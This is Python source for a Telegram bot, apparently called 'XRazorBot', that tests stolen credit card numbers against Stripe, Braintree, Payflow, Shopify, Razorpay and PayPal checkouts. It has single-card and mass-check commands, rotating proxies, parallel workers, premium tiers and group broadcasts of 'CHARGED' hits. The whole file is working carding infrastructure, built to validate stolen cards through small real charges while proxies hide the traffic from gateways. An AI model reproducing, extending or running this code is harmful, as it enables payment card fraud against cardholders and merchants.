            await event.reply(premium_emoji("❌ Usage: <code>/st CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    pending_st5[user_id] = {'card': card}
    buttons = [[Button.inline("🌐 Use Proxy", f"st5_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"st5_noproxy_{user_id}")]]
    await event.reply(premium_emoji("🛒 <b>Stripe $5 Check</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"st5_proxy_(\\d+)"))
async def st5_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_st5.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies available", alert=True)
        return
    proxy = random.choice(proxies)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Stripe $5 with proxy..."), parse_mode='html')
    try:
        result = await check_stripe5_card(card, proxy=proxy)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('stripe5', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"st5_noproxy_(\\d+)"))
async def st5_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_st5.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Stripe $5 (no proxy)..."), parse_mode='html')
    try:
        result = await check_stripe5_card(card, proxy=None)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('stripe5', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# Braintree /bt
@bot.on(events.NewMessage(pattern=r'^/bt\s+'))
async def braintree_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/bt CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    pending_bt[user_id] = {'card': card}
    buttons = [[Button.inline("🌐 Use Proxy", f"bt_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"bt_noproxy_{user_id}")]]
    await event.reply(premium_emoji("🛒 <b>Braintree Check (~$180)</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"bt_proxy_(\\d+)"))
async def bt_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_bt.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies available", alert=True)
        return
    proxy = random.choice(proxies)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Braintree with proxy..."), parse_mode='html')
    try:
        result = await check_braintree_card(card, proxy=proxy)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('braintree', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"bt_noproxy_(\\d+)"))
async def bt_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_bt.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Braintree (no proxy)..."), parse_mode='html')
    try:
        result = await check_braintree_card(card, proxy=None)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('braintree', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# Payflow $18 /pf
@bot.on(events.NewMessage(pattern=r'^/pf\s+'))
async def payflow_single(event):
    user_id = event.sender_id
    add_user_for_broadcast(user_id)
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if event.reply_to_msg_id:
        reply = await event.get_reply_message()
        card = extract_cc_from_text(reply.raw_text)
        if not card:
            await event.reply(premium_emoji("❌ No CC found."), parse_mode='html')
            return
    else:
        args = event.message.text.split(maxsplit=1)
        if len(args) < 2:
            await event.reply(premium_emoji("❌ Usage: <code>/pf CC|MM|YY|CVV</code>"), parse_mode='html')
            return
        card = extract_cc_from_text(args[1])
        if not card:
            await event.reply(premium_emoji("❌ Invalid CC."), parse_mode='html')
            return
    pending_checks[user_id] = {'gateway': 'payflow', 'card': card}
    buttons = [[Button.inline("🌐 Use Proxy", f"pf_proxy_{user_id}"), Button.inline("⚡ No Proxy", f"pf_noproxy_{user_id}")]]
    await event.reply(premium_emoji("💰 <b>Payflow $18 Check</b>\n\nChoose option:"), buttons=buttons, parse_mode='html')

@bot.on(events.CallbackQuery(pattern=b"pf_proxy_(\\d+)"))
async def pf_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_checks.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    proxies = load_proxies()
    if not proxies:
        await event.answer("❌ No proxies available", alert=True)
        return
    proxy_str = random.choice(proxies)
    proxy_dict = proxy_str_to_dict(proxy_str)
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Payflow $18 with proxy..."), parse_mode='html')
    try:
        result = await check_payflow_card(card, proxy=proxy_dict)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('payflow', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

@bot.on(events.CallbackQuery(pattern=b"pf_noproxy_(\\d+)"))
async def pf_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_checks.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    card = data['card']
    start_time = time.time()
    status_msg = await event.reply(premium_emoji("🔄 Checking Payflow $18 (no proxy)..."), parse_mode='html')
    try:
        result = await check_payflow_card(card, proxy=None)
        sender = await event.get_sender()
        user_info = {'id': user_id, 'username': sender.username or "", 'first_name': sender.first_name or "User"}
        formatted = await format_single_result('payflow', result, start_time, sender.username, not is_premium(user_id), user_id=user_id)
        await status_msg.edit(premium_emoji(formatted), parse_mode='html')
        if result['status'] == 'CHARGED':
            await broadcast_charged_hit(result, user_info)
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
    finally:
        await event.answer()

# ========== MASS CHECK COMMANDS ==========
# Shopify mass /chk
@bot.on(events.NewMessage(pattern='/chk'))
async def shopify_mass(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = [extract_cc_from_text(line) for line in content.splitlines() if extract_cc_from_text(line)]
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
            os.remove(file_path)
            return
        if len(cards) > MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Limit is {MAX_CARDS} cards. Limiting to first {MAX_CARDS}."), parse_mode='html')
            cards = cards[:MAX_CARDS]
        if is_free_user_in_free_group(event) and len(cards) > FREE_GROUP_MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Free group limit is {FREE_GROUP_MAX_CARDS} cards. Limiting to first {FREE_GROUP_MAX_CARDS}."), parse_mode='html')
            cards = cards[:FREE_GROUP_MAX_CARDS]
        total = len(cards)
        pending_mass[user_id] = {
            'cards': cards,
            'total': total,
            'status_msg_id': status_msg.id,
            'gateway': 'shopify',
            'file_path': file_path,
            'chat_id': event.chat_id,
            'cmd_msg_id': event.id
        }
        buttons = [[Button.inline("🌐 Use Proxy (10 workers)", f"mass_proxy_{user_id}"), Button.inline("⚡ No Proxy (10 workers)", f"mass_noproxy_{user_id}")]]
        await status_msg.edit(premium_emoji("🛒 Choose proxy option for Shopify mass check:\n• Proxy: 10 parallel workers\n• No Proxy: 10 parallel workers (all users)"), buttons=buttons, parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# Stripe Auth mass /tau
@bot.on(events.NewMessage(pattern='/tau'))
async def stripe_auth_mass(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = [extract_cc_from_text(line) for line in content.splitlines() if extract_cc_from_text(line)]
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
            os.remove(file_path)
            return
        if len(cards) > MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Limit is {MAX_CARDS} cards. Limiting to first {MAX_CARDS}."), parse_mode='html')
            cards = cards[:MAX_CARDS]
        if is_free_user_in_free_group(event) and len(cards) > FREE_GROUP_MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Free group limit is {FREE_GROUP_MAX_CARDS} cards. Limiting to first {FREE_GROUP_MAX_CARDS}."), parse_mode='html')
            cards = cards[:FREE_GROUP_MAX_CARDS]
        total = len(cards)
        pending_mass[user_id] = {
            'cards': cards,
            'total': total,
            'status_msg_id': status_msg.id,
            'gateway': 'stripe',
            'file_path': file_path,
            'chat_id': event.chat_id,
            'cmd_msg_id': event.id
        }
        buttons = [[Button.inline("🌐 Use Proxy (4 workers)", f"stripe_mass_proxy_{user_id}"), Button.inline("🚫 No Proxy (4 workers)", f"stripe_mass_noproxy_{user_id}")]]
        await status_msg.edit(premium_emoji("💳 <b>Stripe Auth Mass Check</b>\n\nChoose proxy option (4 workers both):"), buttons=buttons, parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# Stripe $5 mass /tst
@bot.on(events.NewMessage(pattern='/tst'))
async def stripe5_mass(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = [extract_cc_from_text(line) for line in content.splitlines() if extract_cc_from_text(line)]
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
            os.remove(file_path)
            return
        if len(cards) > STRIPE5_MASS_LIMIT:
            await status_msg.edit(premium_emoji(f"⚠️ Stripe $5 mass limit is {STRIPE5_MASS_LIMIT} cards. Limiting to first {STRIPE5_MASS_LIMIT}."), parse_mode='html')
            cards = cards[:STRIPE5_MASS_LIMIT]
        if is_free_user_in_free_group(event) and len(cards) > FREE_GROUP_MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Free group limit is {FREE_GROUP_MAX_CARDS} cards. Limiting to first {FREE_GROUP_MAX_CARDS}."), parse_mode='html')
            cards = cards[:FREE_GROUP_MAX_CARDS]
        total = len(cards)
        pending_stripe5_mass[user_id] = {
            'cards': cards,
            'total': total,
            'status_msg_id': status_msg.id,
            'file_path': file_path,
            'chat_id': event.chat_id,
            'cmd_msg_id': event.id
        }
        buttons = [[Button.inline("🌐 Use Proxy (10 workers)", f"st5mass_proxy_{user_id}"), Button.inline("⚡ No Proxy (1 worker, Owner only)", f"st5mass_noproxy_{user_id}")]]
        await status_msg.edit(premium_emoji("💵 <b>Stripe $5 Mass Check</b>\n\nChoose proxy option:\n• Proxy: 10 parallel workers\n• No Proxy: 1 worker (owner only)"), buttons=buttons, parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# Razorpay mass /trz
@bot.on(events.NewMessage(pattern='/trz'))
async def razorpay_mass(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if is_free_user_in_free_group(event):
        await event.reply(premium_emoji("❌ Razorpay mass checks are premium-only."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = [extract_cc_from_text(line) for line in content.splitlines() if extract_cc_from_text(line)]
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
            os.remove(file_path)
            return
        if len(cards) > RAZORPAY_MASS_LIMIT:
            await status_msg.edit(premium_emoji(f"⚠️ Razorpay mass limit is {RAZORPAY_MASS_LIMIT} cards. Limiting to first {RAZORPAY_MASS_LIMIT}."), parse_mode='html')
            cards = cards[:RAZORPAY_MASS_LIMIT]
        if is_free_user_in_free_group(event) and len(cards) > FREE_GROUP_MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Free group limit is {FREE_GROUP_MAX_CARDS} cards. Limiting to first {FREE_GROUP_MAX_CARDS}."), parse_mode='html')
            cards = cards[:FREE_GROUP_MAX_CARDS]
        total = len(cards)
        pending_razorpay_mass[user_id] = {
            'cards': cards,
            'total': total,
            'status_msg_id': status_msg.id,
            'file_path': file_path,
            'chat_id': event.chat_id,
            'cmd_msg_id': event.id
        }
        buttons = [[Button.inline("🌐 Use Proxy (5 workers)", f"rzmass_proxy_{user_id}"), Button.inline("⚡ No Proxy (1 worker, Owner only)", f"rzmass_noproxy_{user_id}")]]
        await status_msg.edit(premium_emoji("🔰 <b>Razorpay Mass Check</b>\n\nChoose proxy option:\n• Proxy: 5 parallel workers\n• No Proxy: 1 worker (owner only)"), buttons=buttons, parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# Payflow $18 mass /tpf
@bot.on(events.NewMessage(pattern='/tpf'))
async def payflow_mass(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = [extract_cc_from_text(line) for line in content.splitlines() if extract_cc_from_text(line)]
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
            os.remove(file_path)
            return
        if len(cards) > PAYFLOW_MASS_LIMIT:
            await status_msg.edit(premium_emoji(f"⚠️ Payflow mass limit is {PAYFLOW_MASS_LIMIT} cards. Limiting to first {PAYFLOW_MASS_LIMIT}."), parse_mode='html')
            cards = cards[:PAYFLOW_MASS_LIMIT]
        if is_free_user_in_free_group(event) and len(cards) > FREE_GROUP_MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Free group limit is {FREE_GROUP_MAX_CARDS} cards. Limiting to first {FREE_GROUP_MAX_CARDS}."), parse_mode='html')
            cards = cards[:FREE_GROUP_MAX_CARDS]
        total = len(cards)
        pending_payflow_mass[user_id] = {
            'cards': cards,
            'total': total,
            'status_msg_id': status_msg.id,
            'file_path': file_path,
            'chat_id': event.chat_id,
            'cmd_msg_id': event.id
        }
        buttons = [[Button.inline("🌐 Use Proxy (8 workers)", f"pfmass_proxy_{user_id}"), Button.inline("⚡ No Proxy (1 worker, Owner only)", f"pfmass_noproxy_{user_id}")]]
        await status_msg.edit(premium_emoji("💰 <b>Payflow $18 Mass Check</b>\n\nChoose proxy option:\n• Proxy: 8 parallel workers\n• No Proxy: 1 worker (owner only)"), buttons=buttons, parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# PayPal $1 mass /mpp
@bot.on(events.NewMessage(pattern='/mpp'))
async def paypal_mass(event):
    user_id = event.sender_id
    if not can_use_bot(event):
        await event.reply(premium_emoji("❌ Access Denied. Only premium users can use this bot."), parse_mode='html')
        return
    if is_free_user_in_free_group(event):
        await event.reply(premium_emoji("❌ PayPal mass checks are premium-only."), parse_mode='html')
        return
    if not event.reply_to_msg_id:
        await event.reply(premium_emoji("❌ Reply to a .txt file containing cards."), parse_mode='html')
        return
    reply = await event.get_reply_message()
    if not reply.file or not reply.file.name.endswith('.txt'):
        await event.reply(premium_emoji("❌ Reply to a .txt file."), parse_mode='html')
        return
    status_msg = await event.reply(premium_emoji("📥 Downloading file..."), parse_mode='html')
    file_path = await reply.download_media()
    try:
        async with aiofiles.open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
            content = await f.read()
        cards = [extract_cc_from_text(line) for line in content.splitlines() if extract_cc_from_text(line)]
        if not cards:
            await status_msg.edit(premium_emoji("❌ No valid cards found."), parse_mode='html')
            os.remove(file_path)
            return
        if len(cards) > PAYPAL_MASS_LIMIT:
            await status_msg.edit(premium_emoji(f"⚠️ PayPal $1 mass limit is {PAYPAL_MASS_LIMIT} cards. Limiting to first {PAYPAL_MASS_LIMIT}."), parse_mode='html')
            cards = cards[:PAYPAL_MASS_LIMIT]
        if is_free_user_in_free_group(event) and len(cards) > FREE_GROUP_MAX_CARDS:
            await status_msg.edit(premium_emoji(f"⚠️ Free group limit is {FREE_GROUP_MAX_CARDS} cards. Limiting to first {FREE_GROUP_MAX_CARDS}."), parse_mode='html')
            cards = cards[:FREE_GROUP_MAX_CARDS]
        total = len(cards)
        pending_paypal_mass[user_id] = {
            'cards': cards,
            'total': total,
            'status_msg_id': status_msg.id,
            'file_path': file_path,
            'chat_id': event.chat_id,
            'cmd_msg_id': event.id
        }
        buttons = [[Button.inline("🌐 Use Proxy (12 workers)", f"ppm_proxy_{user_id}"), Button.inline("⚡ No Proxy (1 worker, Owner only)", f"ppm_noproxy_{user_id}")]]
        await status_msg.edit(premium_emoji("💸 <b>PayPal $1 Mass Check</b>\n\nChoose proxy option:\n• Proxy: 12 parallel workers\n• No Proxy: 1 worker (owner only)"), buttons=buttons, parse_mode='html')
    except Exception as e:
        await status_msg.edit(premium_emoji(f"❌ Error: {e}"), parse_mode='html')
        if os.path.exists(file_path):
            os.remove(file_path)

# ========== MASS CHECK CALLBACKS ==========
@bot.on(events.CallbackQuery(pattern=b"mass_proxy_(\\d+)"))
async def mass_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_check(user_id, data, use_proxy=True, concurrency=SHOPIFY_PROXY_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"mass_noproxy_(\\d+)"))
async def mass_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_check(user_id, data, use_proxy=False, concurrency=SHOPIFY_PROXYLESS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"stripe_mass_proxy_(\\d+)"))
async def stripe_mass_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_stripe_mass(user_id, data, use_proxy=True, concurrency=STRIPE_MASS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"stripe_mass_noproxy_(\\d+)"))
async def stripe_mass_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_stripe_mass(user_id, data, use_proxy=False, concurrency=STRIPE_MASS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"st5mass_proxy_(\\d+)"))
async def st5mass_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_stripe5_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_stripe5(user_id, data, use_proxy=True, concurrency=STRIPE5_PROXY_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"st5mass_noproxy_(\\d+)"))
async def st5mass_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    if user_id != OWNER_ID:
        await event.answer("❌ Only the owner can use proxyless Stripe $5 mass check.", alert=True)
        return
    data = pending_stripe5_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_stripe5(user_id, data, use_proxy=False, concurrency=STRIPE5_PROXYLESS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"rzmass_proxy_(\\d+)"))
async def rzmass_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_razorpay_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_razorpay(user_id, data, use_proxy=True, concurrency=RAZORPAY_MASS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"rzmass_noproxy_(\\d+)"))
async def rzmass_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    if user_id != OWNER_ID:
        await event.answer("❌ Only the owner can use proxyless Razorpay mass check.", alert=True)
        return
    data = pending_razorpay_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_razorpay(user_id, data, use_proxy=False, concurrency=1)

@bot.on(events.CallbackQuery(pattern=b"pfmass_proxy_(\\d+)"))
async def pfmass_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_payflow_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_payflow(user_id, data, use_proxy=True, concurrency=PAYFLOW_PROXY_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"pfmass_noproxy_(\\d+)"))
async def pfmass_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    if user_id != OWNER_ID:
        await event.answer("❌ Only the owner can use proxyless Payflow mass check.", alert=True)
        return
    data = pending_payflow_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_payflow(user_id, data, use_proxy=False, concurrency=PAYFLOW_PROXYLESS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"ppm_proxy_(\\d+)"))
async def ppmass_use_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    data = pending_paypal_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_paypal(user_id, data, use_proxy=True, concurrency=PAYPAL_MASS_WORKERS)

@bot.on(events.CallbackQuery(pattern=b"ppm_noproxy_(\\d+)"))
async def ppmass_no_proxy(event):
    user_id = int(event.pattern_match.group(1))
    if event.sender_id != user_id:
        await event.answer("Not your session", alert=True)
        return
    if user_id != OWNER_ID:
        await event.answer("❌ Only the owner can use proxyless PayPal $1 mass check.", alert=True)
        return
    data = pending_paypal_mass.pop(user_id, None)
    if not data:
        await event.answer("Session expired", alert=True)
        return
    await start_mass_paypal(user_id, data, use_proxy=False, concurrency=1)

# ========== MASS CHECK IMPLEMENTATIONS ==========
# Shopify mass
async def start_mass_check(user_id, data, use_proxy, concurrency=1):
    cards = data['cards']
    total = data['total']
    old_msg_id = data['status_msg_id']
    gateway = data['gateway']
    file_path = data.get('file_path')
    chat_id = data.get('chat_id', user_id)
    cmd_msg_id = data.get('cmd_msg_id')
    try:
        await bot.delete_messages(chat_id, old_msg_id)
    except:
        pass
    init_msg = (
        f"✦ $chk | ~ XRazorBot ✦\n"
        f"[⚬] Gateway: Shopify\n"
        f"[⚬] Cards: {total}\n"
        f"[⚬] Status: Checking..."
    )
    init_buttons = [
        [Button.inline("CC ↬ Waiting...", b"mass_noop")],
        [Button.inline("Response ↬ -", b"mass_noop")],
        [Button.inline("Charged ↬ [0] 💎", b"mass_noop"), Button.inline("Approved ↬ [0] ✅", b"mass_noop")],
        [Button.inline("Declined ↬ [0] ❌", b"mass_noop"), Button.inline(f"Progress ↬ [0/{total}] ⏳", b"mass_noop")],
        [Button.inline("⚠️ Stop", b"stop")],
    ]
    progress_msg = await bot.send_message(chat_id, premium_emoji(init_msg), buttons=init_buttons, parse_mode='html')
    status_msg_id = progress_msg.id
    results = {'charged': [], 'approved': [], 'dead': [], 'total': total, 'start_time': time.time(), 'last_card': None, 'command': '/chk'}
    session_key = f"{user_id}_{status_msg_id}"
    active_sessions[session_key] = {'paused': False, 'results': results, 'user_id': user_id}
    queue = asyncio.Queue()
    for c in cards:
        queue.put_nowait(c)
    last_update = time.time()

    async def worker(worker_id):
        while not queue.empty() and session_key in active_sessions:
            sess = active_sessions.get(session_key)
            if not sess:
                break
            while sess.get('paused', False):
                await asyncio.sleep(1)
                sess = active_sessions.get(session_key)
                if not sess:
                    return
            try:
                card = queue.get_nowait()
            except asyncio.QueueEmpty:
                break
            current_sites = load_sites()
